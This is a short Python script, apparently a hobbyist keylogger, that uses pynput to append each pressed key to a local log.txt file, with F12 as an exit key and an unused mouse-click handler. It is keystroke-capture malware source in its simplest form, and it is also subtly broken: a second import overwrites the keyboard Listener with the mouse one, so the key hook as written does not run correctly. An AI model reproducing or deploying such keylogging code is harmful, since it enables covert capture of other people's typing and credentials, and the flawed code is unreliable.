from pynput.keyboard import Listener
from pynput.mouse import Listener

def anonumous(key):
	key = str(key)
	key = key.replace("'","")
	
	key = key.replace("Key.ctrl_l","")
	key = key.replace("Key.ctrl_r","")
	key = key.replace("Key.alt_l","\n")
	key = key.replace("Key.alt_r","\n")
	key = key.replace("Key.tab","\n")

	if key == "Key.f12":
		raise SystemExit(0)

	# if key == "Key.ctrl_l":
	# 	key = ""

	# if key == "":
	# 	pass

	with open("log.txt", "a") as file:
		file.write(key)
	print(key)

def Click(click):
	print('1')

with Listener(on_press=anonumous) as listener:
	listener.join()

with Listener(on_click=Click) as listener:
	listener.join()